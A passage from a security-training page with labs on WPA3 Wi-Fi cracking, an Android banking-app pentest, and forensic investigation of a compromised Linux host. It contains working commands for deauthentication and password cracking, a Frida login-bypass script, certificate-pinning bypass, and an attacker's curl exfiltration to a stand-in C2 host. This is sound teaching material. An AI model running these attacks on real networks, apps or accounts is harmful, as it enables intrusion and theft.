# ==================================================
# NETWORK 3: WPA3 ATTACK (DRAGONBLOOD)
# ==================================================

# Target: "SecureNetwork" (WPA3-SAE)
# Modern, but vulnerable to Dragonblood attacks

# Step 14: Scan for WPA3
sudo airodump-ng wlan0mon | grep SAE

# Output:
# A3:B4:C5:D6:E7:F8  -52  12  2  0  1  54e  WPA3 CCMP SAE  SecureNetwork

# Step 15: Capture SAE handshake
sudo airodump-ng -c 1 --bssid A3:B4:C5:D6:E7:F8 -w wpa3_capture wlan0mon

# Deauth client to capture handshake:
sudo aireplay-ng -0 3 -a A3:B4:C5:D6:E7:F8 wlan0mon

# Step 16: Dragonblood attack (timing-based)
# Tool: dragonslayer
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Run attack:
./dragonslayer.py --interface wlan0mon --bssid A3:B4:C5:D6:E7:F8

# This exploits timing leaks in SAE handshake
# Attack reveals password character by character
# Takes MUCH longer than WPA2 (hours to days)

# Alternative: Downgrade attack
# Some WPA3 routers support WPA2 fallback
# Force AP to use WPA2, then crack normally

# Tool: wpa_supplicant with sae_pwe=0
# Forces transition mode → WPA2 handshake possible

# Step 17: Convert WPA3 capture for hashcat
# If downgrade successful:
hcxpcapngtool -o wpa3_hash.hc22000 wpa3_capture-01.cap
hashcat -m 22000 wpa3_hash.hc22000 rockyou.txt

# ==================================================
# CLEANUP & LESSONS LEARNED
# ==================================================

# Disable monitor mode:
sudo airmon-ng stop wlan0mon

# ✅ WEP: Completely broken, crack in minutes with enough IVs
# ✅ WPA2: Dictionary attack, success depends on password strength
# ✅ WPA3: Much harder, requires advanced attacks or misconfigurations
# ✅ Deauth attacks: Force clients to reconnect, capture handshakes
# ✅ GPU cracking: 100x faster than CPU for WPA2
# ✅ Monitor mode: Essential for WiFi hacking (not all adapters support it!)
# ✅ Legal warning: ONLY test networks you own or have permission!

# Recommended WiFi adapters:
# - ALFA AWUS036NHA (Atheros AR9271) - $40, excellent
# - TP-Link TL-WN722N v1 (NOT v2/v3!) - Cheap, works great
# - Panda PAU09 - Good for beginners
# - ALFA AWUS1900 - Dual-band, expensive but powerful

# Attack summary:
# Network 1 (WEP): Captured 47,000 IVs → Cracked in 2 minutes
# Network 2 (WPA2): Captured handshake → Cracked with hashcat in 3.5 minutes (weak password!)
# Network 3 (WPA3): Downgrade → WPA2 → Cracked (or Dragonblood for days)

# Time taken: ~3 hours
# Difficulty: Beginner (WEP/WPA2), Intermediate (WPA3)</div>

            <h3>Lab 4: Mobile Application Penetration Test (Android APK)</h3>

            <div class="info-box">
                <h4>📋 Lab Overview</h4>
                <p><strong>Target:</strong> BankingApp.apk (fictional vulnerable banking app)<br>
                <strong>Goal:</strong> Find hardcoded secrets, bypass authentication, exploit API endpoints<br>
                <strong>Difficulty:</strong> Intermediate<br>
                <strong>Skills tested:</strong> APK decompilation, code review, API testing, certificate pinning bypass<br>
                <strong>Time estimate:</strong> 3-4 hours<br>
                <strong>Tools used:</strong> apktool, jadx, ADB, Burp Suite, Frida, objection<br>
                <strong>Requirements:</strong> Android device/emulator</p>
            </div>

            <div class="code"># ==================================================
# PHASE 1: APK ACQUISITION & ANALYSIS
# ==================================================

# Scenario: Client provided BankingApp.apk for security assessment

# Step 1: File information
file BankingApp.apk

# Output:
# BankingApp.apk: Zip archive data, at least v2.0 to extract

# APK is just a ZIP file!

unzip -l BankingApp.apk | head -20

# Output:
# Archive:  BankingApp.apk
#   Length      Date    Time    Name
# ---------  ---------- -----   ----
#      1234  2024-01-01 12:00   AndroidManifest.xml
#     45678  2024-01-01 12:00   classes.dex
#     12345  2024-01-01 12:00   resources.arsc
#      5678  2024-01-01 12:00   res/drawable/icon.png
#       890  2024-01-01 12:00   META-INF/MANIFEST.MF
#       456  2024-01-01 12:00   META-INF/CERT.SF
#      1234  2024-01-01 12:00   META-INF/CERT.RSA

# Step 2: Decompile with apktool
apktool d BankingApp.apk -o BankingApp_decompiled

# Output:
# I: Using Apktool 2.7.0
# I: Loading resource table...
# I: Decoding AndroidManifest.xml with resources...
# I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
# I: Regular manifest package...
# I: Decoding file-resources...
# I: Decoding values */* XMLs...
# I: Baksmaling classes.dex...
# I: Copying assets and libs...
# I: Copying unknown files...
# I: Copying original files...

cd BankingApp_decompiled
ls

# Output:
# AndroidManifest.xml
# apktool.yml
# original/
# res/
# smali/          ← Smali bytecode (hard to read)
# unknown/

# Step 3: Decompile to Java with jadx
jadx BankingApp.apk -d BankingApp_java

# Output:
# INFO  - loading ...
# INFO  - processing ...
# INFO  - done

cd BankingApp_java
ls

# Output:
# resources/
# sources/        ← Java source code!

cd sources/com/example/bankingapp

ls

# Output:
# MainActivity.java
# LoginActivity.java
# TransferActivity.java
# ApiClient.java
# Utils.java
# Constants.java

# ==================================================
# PHASE 2: STATIC ANALYSIS (CODE REVIEW)
# ==================================================

# Step 4: Examine AndroidManifest.xml
cat ../../../BankingApp_decompiled/AndroidManifest.xml

# Key findings:
# <uses-permission android:name="android.permission.INTERNET" />
# <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
# <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
# 
# <activity android:name=".MainActivity" android:exported="true">
# <activity android:name=".LoginActivity">
# <activity android:name=".SecretActivity" android:exported="false">
# 
# <service android:name=\".BackgroundService\" android:exported=\"true\">

# ⚠️ Exported activities: Accessible from other apps!
# ⚠️ BackgroundService exported: Can be called externally!
# ⚠️ External storage permissions: Potential data leakage

# Step 5: Search for hardcoded secrets
grep -r "password" . | grep -v ".git"

# Output:
# ./Constants.java:    public static final String DEFAULT_PASSWORD = \"admin123\";
# ./Utils.java:        String password = \"hardcoded_api_key_abc123xyz\";
# ./ApiClient.java:    private static final String API_KEY = \"sk_live_abc123def456\";

# 🎯 Found hardcoded credentials!

cat Constants.java

# Output:
package com.example.bankingapp;

public class Constants {
    public static final String API_BASE_URL = \"https://api.bankingapp.com/v1/\";
    public static final String DEFAULT_USERNAME = \"admin\";
    public static final String DEFAULT_PASSWORD = \"admin123\";
    public static final String ENCRYPTION_KEY = \"MyS3cr3tK3y!2024\";
    public static final boolean DEBUG_MODE = true;  # ← Debug enabled in production!
}

# Step 6: Examine authentication logic
cat LoginActivity.java

# Simplified code:
public class LoginActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        
        Button loginButton = findViewById(R.id.loginButton);
        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String username = usernameField.getText().toString();
                String password = passwordField.getText().toString();
                
                // ⚠️ Client-side authentication!
                if (username.equals(\"admin\") && password.equals(\"admin123\")) {
                    Intent intent = new Intent(LoginActivity.this, MainActivity.class);
                    startActivity(intent);
                } else {
                    Toast.makeText(LoginActivity.this, \"Invalid credentials\", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }
}

# 🚨 CRITICAL: Authentication done client-side!
# No server validation, credentials hardcoded

# Step 7: Find API endpoints
cat ApiClient.java

# Output:
public class ApiClient {
    private static final String API_BASE_URL = \"https://api.bankingapp.com/v1/\";
    private static final String API_KEY = \"sk_live_abc123def456\";
    
    public void getBalance(String accountId) {
        String url = API_BASE_URL + \"balance/\" + accountId;
        // GET request without authentication
    }
    
    public void transfer(String from, String to, double amount) {
        String url = API_BASE_URL + \"transfer\";
        JSONObject body = new JSONObject();
        body.put(\"from\", from);
        body.put(\"to\", to);
        body.put(\"amount\", amount);
        body.put(\"api_key\", API_KEY);  # ← API key in request body!
        // POST request
    }
    
    public void adminPanel() {
        String url = API_BASE_URL + \"admin/users\";
        // Hidden admin endpoint!
    }
}

# 🎯 Found API endpoints:
# - /v1/balance/:accountId
# - /v1/transfer
# - /v1/admin/users

# ==================================================
# PHASE 3: DYNAMIC ANALYSIS (RUNTIME TESTING)
# ==================================================

# Step 8: Install APK on device/emulator
adb devices

# Output:
# List of devices attached
# emulator-5554  device

adb install BankingApp.apk

# Output:
# Performing Streamed Install
# Success

# Step 9: Launch app
adb shell am start -n com.example.bankingapp/.LoginActivity

# App opens on device!

# Step 10: Intercept traffic with Burp Suite

# A) Configure device proxy:
adb shell settings put global http_proxy 192.168.1.10:8080

# B) Install Burp CA certificate on device:
# Export Burp cert: Proxy → Options → Export CA certificate → DER format
# Convert to PEM:
openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem

# Calculate hash:
openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1
# Output: 9a5ba575

# Rename:
mv burp_cert.pem 9a5ba575.0

# Push to device:
adb root
adb remount
adb push 9a5ba575.0 /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
adb reboot

# C) Burp Suite should now intercept app traffic!

# Step 11: Test hardcoded bypass
# Try logging in with admin:admin123

# Burp intercepts:
POST /v1/login HTTP/1.1
Host: api.bankingapp.com
Content-Type: application/json

{
    \"username\": \"admin\",
    \"password\": \"admin123\"
}

# But wait - earlier code showed client-side auth!
# App doesn't even send login request to server
# Just checks credentials locally

# Bypass:
# Option 1: Patch APK to skip login check
# Option 2: Use Frida to hook authentication method

# ==================================================
# PHASE 4: FRIDA HOOKING (BYPASS AUTHENTICATION)
# ==================================================

# Step 12: Install Frida
pip3 install frida-tools

# Download frida-server for Android:
wget https://github.com/frida/frida/releases/download/16.0.19/frida-server-16.0.19-android-x86_64.xz
unxz frida-server-16.0.19-android-x86_64.xz
mv frida-server-16.0.19-android-x86_64 frida-server

# Push to device:
adb push frida-server /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server

# Run frida-server:
adb shell "/data/local/tmp/frida-server &"

# Step 13: List running apps
frida-ps -U

# Output:
#   PID  Name
# -----  ----
#  1234  com.example.bankingapp
#  5678  com.android.systemui

# Step 14: Create Frida script to bypass authentication
cat > bypass_auth.js <<'EOF'
Java.perform(function() {
    console.log("[*] Starting authentication bypass script...");
    
    // Hook LoginActivity.onClick method
    var LoginActivity = Java.use(\"com.example.bankingapp.LoginActivity\");
    
    LoginActivity.onClick.implementation = function(view) {
        console.log(\"[*] onClick method called!\");
        console.log(\"[*] Bypassing authentication check...\");
        
        // Always authenticate successfully
        var Intent = Java.use(\"android.content.Intent\");
        var intent = Intent.$new(this.context, Java.use(\"com.example.bankingapp.MainActivity\").class);
        this.startActivity(intent);
        
        console.log(\"[+] Authentication bypassed! Redirecting to MainActivity\");
    };
    
    console.log(\"[+] Hook installed successfully!\");
});
EOF

# Step 15: Run Frida script
frida -U -f com.example.bankingapp -l bypass_auth.js --no-pause

# Output:
# [*] Starting authentication bypass script...
# [+] Hook installed successfully!

# Now try logging in with ANY credentials → Always works!

# ==================================================
# PHASE 5: API TESTING
# ==================================================

# Step 16: Test balance endpoint
# From ApiClient.java: GET /v1/balance/:accountId

curl -X GET "https://api.bankingapp.com/v1/balance/1001" \\
     -H "X-API-Key: sk_live_abc123def456"

# Response:
{
    \"account_id\": \"1001\",
    \"balance\": 5000.00,
    \"currency\": \"USD\"
}

# ✅ API accepts hardcoded key!

# Step 17: Test IDOR (Insecure Direct Object Reference)
# Try accessing other users' balances:
curl -X GET "https://api.bankingapp.com/v1/balance/1002" \\
     -H "X-API-Key: sk_live_abc123def456"

# Response:
{
    \"account_id\": \"1002\",
    \"balance\": 10000.00,
    \"currency\": \"USD\"
}

# 🚨 CRITICAL: Can view any user's balance!

# Step 18: Test transfer endpoint
curl -X POST "https://api.bankingapp.com/v1/transfer" \\
     -H "Content-Type: application/json" \\
     -d '{
       \"from\": \"1002\",
       \"to\": \"1001\",
       \"amount\": 1000,
       \"api_key\": \"sk_live_abc123def456\"
     }'

# Response:
{
    \"status\": \"success\",
    \"transaction_id\": \"TXN123456\",
    \"message\": \"Transfer completed\"
}

# 🚨 CRITICAL: Can transfer money from ANY account!
# No validation of account ownership

# Step 19: Test admin endpoint
curl -X GET "https://api.bankingapp.com/v1/admin/users" \\
     -H "X-API-Key: sk_live_abc123def456"

# Response:
{
    \"users\": [
        {\"id\": 1001, \"username\": \"user1\", \"email\": \"user1@example.com\"},
        {\"id\": 1002, \"username\": \"user2\", \"email\": \"user2@example.com\"},
        {\"id\": 1003, \"username\": \"admin\", \"email\": \"admin@bankingapp.com\"}
    ]
}

# 🚨 CRITICAL: Admin endpoint accessible with regular API key!

# ==================================================
# PHASE 6: CERTIFICATE PINNING BYPASS
# ==================================================

# Some apps implement certificate pinning:
# App only trusts specific SSL certificates
# Prevents MITM attacks (Burp Suite interception)

# Step 20: Check for certificate pinning
# Look in decompiled code for:
# - OkHttp CertificatePinner
# - TrustManager implementations
# - SSL pinning keywords

grep -r "CertificatePinner" BankingApp_java/sources/

# Found in NetworkModule.java:
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add(\"api.bankingapp.com\", \"sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\")
    .build();

# Certificate pinning detected!

# Step 21: Bypass with Frida + objection
pip3 install objection

# Launch app with objection:
objection -g com.example.bankingapp explore

# Inside objection:
android sslpinning disable

# Output:
# (agent) [3r4nklgt1o7] Custom TrustManager ready
# (agent) [3r4nklgt1o7] Hooking OkHTTP3
# (agent) [3r4nklgt1o7] Hooking Apache HttpClient
# (agent) [3r4nklgt1o7] Hooking WebView
# (agent) Monitoring SSL pinning

# Now Burp Suite intercepts traffic even with pinning!

# ==================================================
# PHASE 7: REPORT FINDINGS
# ==================================================

# Critical vulnerabilities found:

# 1. ⚠️ CRITICAL - Hardcoded Credentials
#    Location: Constants.java
#    Impact: Default admin credentials exposed
#    Fix: Remove hardcoded credentials, use secure storage

# 2. ⚠️ CRITICAL - Client-Side Authentication
#    Location: LoginActivity.java
#    Impact: Authentication bypass via code modification/Frida
#    Fix: Implement server-side authentication

# 3. ⚠️ CRITICAL - Hardcoded API Key
#    Location: ApiClient.java, Utils.java
#    Impact: API key compromise, unauthorized access
#    Fix: Use secure key storage (Android Keystore)

# 4. ⚠️ CRITICAL - IDOR Vulnerability
#    Endpoints: /v1/balance/:id, /v1/transfer
#    Impact: Access any user's data, unauthorized transfers
#    Fix: Implement proper authorization checks

# 5. ⚠️ HIGH - Exposed Admin Endpoint
#    Endpoint: /v1/admin/users
#    Impact: User enumeration, privilege escalation
#    Fix: Add admin-specific authentication

# 6. ⚠️ MEDIUM - Debug Mode Enabled
#    Location: Constants.java
#    Impact: Verbose logging may expose sensitive data
#    Fix: Disable debug mode in production builds

# 7. ⚠️ MEDIUM - Excessive Permissions
#    Location: AndroidManifest.xml
#    Impact: Unnecessary access to external storage
#    Fix: Remove unused permissions

# 8. ⚠️ LOW - Certificate Pinning Present (but bypassable)
#    Location: NetworkModule.java
#    Impact: Can be bypassed with Frida
#    Fix: Implement root/tamper detection

# ==================================================
# LESSONS LEARNED
# ==================================================

# ✅ APK = ZIP file, easily decompilable
# ✅ Always check for hardcoded secrets (grep -r \"password\", \"api_key\", \"secret\")
# ✅ Client-side checks are NOT security controls
# ✅ Frida = Powerful for runtime manipulation
# ✅ Certificate pinning can be bypassed (objection, Frida, Xposed)
# ✅ IDOR vulnerabilities common in mobile APIs
# ✅ Mobile apps often have weaker security than web apps
# ✅ Always test both static (code) and dynamic (runtime) analysis

# Mobile security checklist:
# ☐ Decompile APK (apktool, jadx)
# ☐ Search for hardcoded secrets
# ☐ Review AndroidManifest.xml permissions
# ☐ Check for exported components
# ☐ Test authentication/authorization
# ☐ Intercept network traffic (Burp Suite)
# ☐ Test API endpoints (Postman, curl)
# ☐ Check for IDOR/BOLA vulnerabilities
# ☐ Test certificate pinning bypass
# ☐ Check for root detection (if present, bypass)
# ☐ Test data storage (SharedPreferences, SQLite databases)
# ☐ Review WebView implementations
# ☐ Test for insecure data storage

# Time taken: ~4 hours
# Difficulty: Intermediate (requires Android knowledge)</div>

            <h3>Lab 5: Complete Forensics Investigation (Digital Evidence Analysis)</h3>

            <div class="info-box">
                <h4>📋 Lab Overview</h4>
                <p><strong>Target:</strong> Disk image from compromised system<br>
                <strong>Goal:</strong> Determine how attacker gained access, what was stolen, establish timeline<br>
                <strong>Difficulty:</strong> Intermediate<br>
                <strong>Skills tested:</strong> Disk forensics, memory analysis, timeline creation, artifact analysis<br>
                <strong>Time estimate:</strong> 4-5 hours<br>
                <strong>Tools used:</strong> Autopsy, Volatility, Sleuthkit, ExifTool, Wireshark, Timeline Explorer<br>
                <strong>Requirements:</strong> Disk image (compromised_system.dd), memory dump (memory.raw)</p>
            </div>

            <div class="code"># ==================================================
# SCENARIO: INCIDENT RESPONSE
# ==================================================

# Call received: "Our employee's laptop was compromised. We isolated it
# and created a disk image + memory dump. Need to know:
#   1. How did attacker get in?
#   2. What data was accessed/exfiltrated?
#   3. Is attacker still present?"

# Files provided:
# - compromised_system.dd (100GB disk image)
# - memory.raw (8GB memory dump)
# - network_capture.pcap (packet capture during incident)

# Timeline: System compromised on 2024-01-15, discovered on 2024-01-18

# ==================================================
# PHASE 1: DISK IMAGE ANALYSIS
# ==================================================

# Step 1: Verify image integrity
sha256sum compromised_system.dd

# Output:
# abc123def456...  compromised_system.dd

# Document hash for evidence chain of custody

# Step 2: Mount image (read-only!)
sudo mkdir /mnt/evidence
sudo mount -o ro,loop,noexec compromised_system.dd /mnt/evidence

# Step 3: Initial reconnaissance
ls -la /mnt/evidence

# Output:
# bin/
# boot/
# dev/
# etc/
# home/
# usr/
# var/
# 
# Looks like Linux system (Ubuntu)

# Check OS version:
cat /mnt/evidence/etc/os-release

# Output:
# NAME=\"Ubuntu\"
# VERSION=\"22.04.1 LTS\"
# ID=ubuntu

# Step 4: Identify users
cat /mnt/evidence/etc/passwd | grep -v nologin

# Output:
# root:x:0:0:root:/root:/bin/bash
# jsmith:x:1000:1000:John Smith:/home/jsmith:/bin/bash

# Primary user: jsmith (UID 1000)

# ==================================================
# PHASE 2: TIMELINE CREATION
# ==================================================

# Step 5: Create comprehensive timeline
# (MACB times: Modified, Accessed, Changed, Birth)

fls -r -m / /mnt/evidence > timeline_bodyfile.txt

# Parse with mactime:
mactime -b timeline_bodyfile.txt -d > timeline_full.csv

# Filter to incident window (2024-01-15 to 2024-01-18):
grep "2024-01-1[5-8]" timeline_full.csv > timeline_incident.csv

# Step 6: Analyze timeline with Timeline Explorer
# (Import timeline_incident.csv into Timeline Explorer or Excel)

# Key findings from timeline:
# 2024-01-15 14:23:15 - /home/jsmith/Downloads/invoice.pdf.exe (CREATED)
# 2024-01-15 14:24:03 - /home/jsmith/Downloads/invoice.pdf.exe (EXECUTED)
# 2024-01-15 14:24:15 - /tmp/.hidden_backdoor (CREATED)
# 2024-01-15 14:24:18 - /home/jsmith/.bash_history (MODIFIED)
# 2024-01-15 14:25:00 - /var/log/auth.log (MODIFIED)
# 2024-01-15 14:30:12 - /home/jsmith/Documents/*.docx (ACCESSED)
# 2024-01-15 14:35:45 - /home/jsmith/Documents/exfil.zip (CREATED)
# 2024-01-15 14:36:12 - /var/log/syslog (MODIFIED)

# 🎯 Initial vector: invoice.pdf.exe (malicious executable)

# ==================================================
# PHASE 3: MALWARE ANALYSIS
# ==================================================

# Step 7: Extract malicious file
cp /mnt/evidence/home/jsmith/Downloads/invoice.pdf.exe malware_sample.exe

# NEVER run unknown executables!

# Step 8: Basic static analysis
file malware_sample.exe

# Output:
# malware_sample.exe: ELF 64-bit LSB executable, x86-64

# It's a Linux binary (not Windows .exe despite extension!)

strings malware_sample.exe | grep -i http

# Output:
# http://attacker-c2.evil.com:4444
# POST /upload
# GET /command

# 🎯 C2 server: attacker-c2.evil.com:4444

# Check for packing/obfuscation:
upx -t malware_sample.exe

# Output:
# upx: malware_sample.exe: NotPackedException: not packed by UPX

# Not UPX-packed

# Calculate hashes:
md5sum malware_sample.exe
sha256sum malware_sample.exe

# Check VirusTotal:
# (Upload hashes, not file itself to avoid leaking evidence)
# Or use API:
curl -X POST 'https://www.virustotal.com/vtapi/v2/file/report' \\
     -d apikey=YOUR_API_KEY \\
     -d resource=SHA256_HASH

# Step 9: Dynamic analysis (sandbox)
# Upload to any.run, hybrid-analysis.com, or local Cuckoo sandbox

# Findings from sandbox:
# - Connects to attacker-c2.evil.com:4444
# - Creates /tmp/.hidden_backdoor
# - Modifies .bash_history (anti-forensics)
# - Searches for document files
# - Compresses documents into exfil.zip
# - Attempts to upload exfil.zip to C2

# ==================================================
# PHASE 4: USER ACTIVITY ANALYSIS
# ==================================================

# Step 10: Check bash history
cat /mnt/evidence/home/jsmith/.bash_history

# Output:
# cd Downloads
# ls -la
# chmod +x invoice.pdf.exe
# ./invoice.pdf.exe  # ← User executed malware!
# # Attacker commands below:
# whoami
# id
# uname -a
# cat /etc/passwd
# find /home -name "*.docx" -o -name "*.pdf"
# zip -r /home/jsmith/Documents/exfil.zip /home/jsmith/Documents/
# curl -X POST -F "file=@/home/jsmith/Documents/exfil.zip" http://attacker-c2.evil.com:4444/upload
# rm exfil.zip
# history -c  # ← Attempted to clear history (didn't work completely)

# 🎯 Attacker commands documented!

# Step 11: Check browser history
# Firefox:
sqlite3 /mnt/evidence/home/jsmith/.mozilla/firefox/*/places.sqlite \\
    "SELECT datetime(visit_date/1000000,'unixepoch'), url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY visit_date DESC LIMIT 20;"

# Output:
# 2024-01-15 14:20:00|https://mail.google.com
# 2024-01-15 14:21:35|https://drive.google.com/file/d/abc123/download  # ← Malware download
# 2024-01-15 14:22:15|https://github.com
# ...

# 🎯 Malware downloaded from Google Drive link!

# Step 12: Check email
# (Requires email client data or webmail analysis)

# If Thunderbird:
grep -r "invoice" /mnt/evidence/home/jsmith/.thunderbird/

# Or extract from mail spool:
strings /mnt/evidence/var/mail/jsmith | grep -A 10 "Subject: Invoice"

# Email found:
# From: finance@fake-vendor.com
# To: jsmith@company.com
# Subject: URGENT: Unpaid Invoice #12345
# 
# Dear John,
# 
# Your account has an unpaid invoice. Please review the attached invoice immediately.
# 
# Download invoice: https://drive.google.com/file/d/abc123/download
# 
# Regards,
# Finance Department

# 🎯 Phishing email → User clicked malicious link

# ==================================================
# PHASE 5: NETWORK TRAFFIC ANALYSIS
# ==================================================

# Step 13: Analyze packet capture
wireshark network_capture.pcap &

# Or CLI with tshark:
tshark -r network_capture.pcap -Y "http" -T fields -e frame.time -e ip.src -e ip.dst -e http.request.uri

# Findings:
# 2024-01-15 14:24:05  10.0.0.50  185.123.45.67  GET /payload.bin
# 2024-01-15 14:24:15  10.0.0.50  185.123.45.67  POST /register
# 2024-01-15 14:30:00  10.0.0.50  185.123.45.67  GET /command
# 2024-01-15 14:35:50  10.0.0.50  185.123.45.67  POST /upload (2.3MB)

# 185.123.45.67 = attacker-c2.evil.com

# Step 14: Extract uploaded file from PCAP
tshark -r network_capture.pcap -Y "http.request.method == POST and http.request.uri == /upload" -T fields -e http.file_data | xxd -r -p > recovered_exfil.zip

# Verify:
file recovered_exfil.zip
# Output: Zip archive data

unzip -l recovered_exfil.zip

# Output:
# Archive:  recovered_exfil.zip
#   Length      Date    Time    Name
# ---------  ---------- -----   ----
#    123456  2024-01-15 14:35   Q4_Financial_Report.docx
#     45678  2024-01-15 14:35   Customer_Database.xlsx
#     78901  2024-01-15 14:35   Employee_SSNs.pdf
#      3456  2024-01-15 14:35   Company_Secrets.txt

# 🎯 CRITICAL: Sensitive company data exfiltrated!

# ==================================================
# PHASE 6: MEMORY ANALYSIS
# ==================================================

# Step 15: Analyze memory dump with Volatility
volatility3 -f memory.raw windows.info

# Wait, error: "Unable to find Windows structures"

# Try Linux:
volatility3 -f memory.raw linux.bash

# Output:
# Pid    Process              CommandTime                 Command
# 1234   bash                 2024-01-15 14:24:03         ./invoice.pdf.exe
# 1234   bash                 2024-01-15 14:25:15         whoami
# 1234   bash                 2024-01-15 14:26:00         find /home -name "*.docx"

# ✅ Confirmed attacker commands in memory

# Step 16: Extract network connections
volatility3 -f memory.raw linux.pslist

# Output:
# PID  PPID  COMM
# 1234 1000  bash
# 5678 1234  .hidden_backdoor

# Process 5678 = Backdoor!

volatility3 -f memory.raw linux.netstat

# Output:
# Proto  Local Address       Foreign Address     State       PID
# TCP    10.0.0.50:45123     185.123.45.67:4444  ESTABLISHED 5678

# ✅ Active C2 connection at time of memory capture!

# Step 17: Dump suspicious process
volatility3 -f memory.raw -o /tmp/dump linux.proc.Maps --pid 5678

# Extract binary:
volatility3 -f memory.raw linux.elfdump --pid 5678 -o /tmp/dump

# Compare with disk artifact:
diff /tmp/.hidden_backdoor /tmp/dump/5678.elf

# ✅ Same backdoor running in memory

# ==================================================
# PHASE 7: PERSISTENCE MECHANISMS
# ==================================================

# Step 18: Check for persistence
# Common locations:

# Cron jobs:
cat /mnt/evidence/var/spool/cron/crontabs/jsmith

# Output:
# @reboot /tmp/.hidden_backdoor &  # ← Persistence!

# Systemd services:
ls /mnt/evidence/etc/systemd/system/

# Output:
# backdoor.service  # ← Found malicious service!

cat /mnt/evidence/etc/systemd/system/backdoor.service

# Output:
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/tmp/.hidden_backdoor
Restart=always
User=root  # ← Running as root!

[Install]
WantedBy=multi-user.target

# 🚨 CRITICAL: Backdoor configured to run as root at boot!

# SSH keys:
cat /mnt/evidence/home/jsmith/.ssh/authorized_keys

# Output:
# (Normal keys...)
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil  # ← Attacker's SSH key!

# 🚨 Attacker added SSH key for persistent access!

# ==================================================
# PHASE 8: DATA EXFILTRATION ASSESSMENT
# ==================================================

# Step 19: Identify all accessed sensitive files
grep "2024-01-15" timeline_incident.csv | grep ACCESSED | grep -i "document\\|financial\\|secret\\|confidential"

# Files accessed:
# /home/jsmith/Documents/Q4_Financial_Report.docx
# /home/jsmith/Documents/Customer_Database.xlsx
# /home/jsmith/Documents/Employee_SSNs.pdf
# /home/jsmith/Desktop/Company_Secrets.txt

# Step 20: Check file metadata
exiftool /mnt/evidence/home/jsmith/Documents/Q4_Financial_Report.docx

# Output:
# File Name: Q4_Financial_Report.docx
# File Size: 123 kB
# File Modified Date: 2024-01-15 14:30:12
# File Accessed Date: 2024-01-15 14:30:12  # ← Accessed during incident
# Author: John Smith
# Company: VictimCompany Inc.
# Subject: Q4 2023 Financial Results - CONFIDENTIAL

# Step 21: Search for other exfiltration attempts
grep -r "curl\\|wget\\|scp\\|ftp" /mnt/evidence/home/jsmith/.bash_history

# Found:
# curl -X POST -F "file=@/home/jsmith/Documents/exfil.zip" http://attacker-c2.evil.com:4444/upload

# Only one exfiltration attempt detected

# ==================================================
# PHASE 9: INDICATORS OF COMPROMISE (IOCs)
# ==================================================

# Compile IOCs for threat hunting:

# File Hashes:
# - invoice.pdf.exe: SHA256: abc123...
# - .hidden_backdoor: SHA256: def456...

# Network IOCs:
# - IP: 185.123.45.67 (attacker-c2.evil.com)
# - Port: 4444/TCP
# - URL: http://attacker-c2.evil.com:4444/upload
# - Google Drive link: https://drive.google.com/file/d/abc123/

# Email IOCs:
# - Sender: finance@fake-vendor.com
# - Subject: URGENT: Unpaid Invoice #12345

# File IOCs:
# - /tmp/.hidden_backdoor
# - /etc/systemd/system/backdoor.service
# - Cron job: /var/spool/cron/crontabs/jsmith
# - SSH key in authorized_keys

# Registry changes (if Windows):
# N/A (Linux system)

# ==================================================
# PHASE 10: INCIDENT REPORT
# ==================================================

# EXECUTIVE SUMMARY:

# On January 15, 2024, employee John Smith received a phishing email
# containing a malicious link disguised as an invoice. Upon clicking,
# malware was downloaded and executed, establishing command-and-control
# communication with attacker infrastructure. The attacker enumerated
# the system, located sensitive documents, and successfully exfiltrated
# 2.3MB of confidential data including financial reports, customer
# databases, and employee records. Persistence mechanisms were installed
# including cron jobs, systemd services, and SSH backdoor. The compromise
# remained undetected for 3 days until anomalous network activity
# triggered an alert.

# TIMELINE:
# Jan 15, 14:21 - Phishing email received
# Jan 15, 14:23 - User downloads malware (invoice.pdf.exe)
# Jan 15, 14:24 - User executes malware
# Jan 15, 14:24 - C2 connection established
# Jan 15, 14:25 - Attacker reconnaissance (whoami, uname, etc.)
# Jan 15, 14:30 - Attacker locates sensitive files
# Jan 15, 14:35 - Data exfiltration (2.3MB zip file uploaded)
# Jan 15, 14:36 - Persistence mechanisms installed
# Jan 18, 09:00 - Anomalous traffic detected, incident response initiated

# IMPACT:
# ⚠️ HIGH - Confidential financial data exfiltrated
# ⚠️ HIGH - Customer PII (database with SSNs) compromised
# ⚠️ HIGH - Persistent backdoor with root access installed
# ⚠️ MEDIUM - Employee productivity loss during investigation
# ⚠️ LOW - No evidence of lateral movement to other systems

# RECOMMENDATIONS:
# 1. Immediately block IOCs (IPs, domains, hashes) at firewall/proxy
# 2. Revoke John Smith's credentials and issue new ones
# 3. Rebuild compromised system from clean image
# 4. Conduct threat hunting across entire network using IOCs
# 5. Implement email security training (anti-phishing)
# 6. Deploy EDR solution for better detection
# 7. Implement email gateway with attachment sandboxing
# 8. Enable MFA for all accounts
# 9. Restrict executable files in Downloads directory
# 10. Notify affected customers per breach notification laws

# ==================================================
# LESSONS LEARNED
# ==================================================

# ✅ Always verify image integrity (hashes)
# ✅ Mount images read-only to preserve evidence
# ✅ Timeline analysis reveals attack progression
# ✅ Browser/email history shows initial infection vector
# ✅ Bash history documents attacker actions
# ✅ Network capture confirms exfiltration
# ✅ Memory analysis finds active threats
# ✅ Check ALL persistence locations (cron, systemd, SSH, etc.)
# ✅ Calculate hashes for all malicious files (IOCs)
# ✅ Document entire chain of custody

# Forensics workflow summary:
# 1. Acquire evidence (disk image, memory dump, network capture)
# 2. Verify integrity (hashes, write-blockers)
